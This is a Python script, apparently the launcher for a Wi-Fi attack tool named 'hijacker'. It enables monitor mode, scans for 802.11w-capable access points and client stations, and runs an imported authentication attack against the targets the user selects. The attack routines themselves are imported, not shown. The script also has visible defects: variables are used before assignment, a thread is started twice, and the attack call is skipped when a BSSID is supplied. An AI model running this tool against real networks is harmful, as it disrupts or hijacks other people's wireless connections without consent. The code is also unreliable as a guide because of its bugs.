#!/usr/bin/env python3
import os
import sys
from argparse import ArgumentParser

from termcolor import cprint

from hijacker.attacks import auth_attack
from hijacker.core import AP
from hijacker.interface import MonitorInterface
from hijacker.threads import ScannerThread


def get_aps(mon_interface):
    targets = {}
    seen_essids = set()
    print("Hit Ctrl-C when ready to select a BSS")
    while True:
        try:
            target = mon_interface.get_new_target()
            seen_essids.add(target.essid)
            color, msg, n = None, None, None
            if target.w:
                n = len(targets)
                targets[n] = target
                msg = '| 802.11w: ' + target.w
                color = 'on_magenta'
            cprint("{} {} {}".format(target.essid, msg or '',
                                     '({})'.format(n) if n else ''),
                   'white', color)
        except KeyboardInterrupt:
            return targets


def get_stations(mon_interface):
    clients = {}
    print("Hit Ctrl-C when ready to select a client")
    while True:
        try:
            client = mon_interface.get_new_client()
            n = len(clients)
            clients[n] = client
            cprint("Discovered client {} ({})".format(client.mac_addr, n), 'cyan', 'on_grey')
        except KeyboardInterrupt:
            return clients


def main():
    if os.getuid() != 0:
        print("Must be root!!! Exiting...")
        sys.exit()

    parser = ArgumentParser()
    parser.add_argument('mon_interface', help='The interface to use for scanning and deauth (must '
                                              'support packet injection)')
    parser.add_argument('-b', '--bssid', dest='bssid', required=False,
                        help='The target BSSID. Must support 802.11w.')
    parser.add_argument('-c', '--channel', dest='channel', required=False, help='The target BSS channel.')
    parser.add_argument('-s', '--station', dest='station', required=False, help="The MAC address of a target station.")
    args = parser.parse_args()

    mon_interface = MonitorInterface(args.mon_interface)
    print("Enabled monitor mode on interface", mon_interface.name)
    if args.bssid and args.channel:
        ap = AP(args.bssid, essid=None, encrypt="WPA2", channel=args.channel)
    else:
        scan_thread = ScannerThread(mon_interface)
        scan_thread.start()
        aps = get_aps(mon_interface)
        scan_thread.stop()
        scan_thread.join()

        while not ap:
            ap = aps.get(input("Select a target access point from the list"))

        mon_interface.channel = ap.channel

        if args.station:
            station = args.station
        else:
            scan_thread.start()
            stations = get_stations(mon_interface)
            scan_thread.stop()
            scan_thread.join()

        while not station:
            station = stations.get(input("Select a target station from the list"))

        auth_attack(station, ap, mon_interface)

if __name__ == '__main__':
    main()
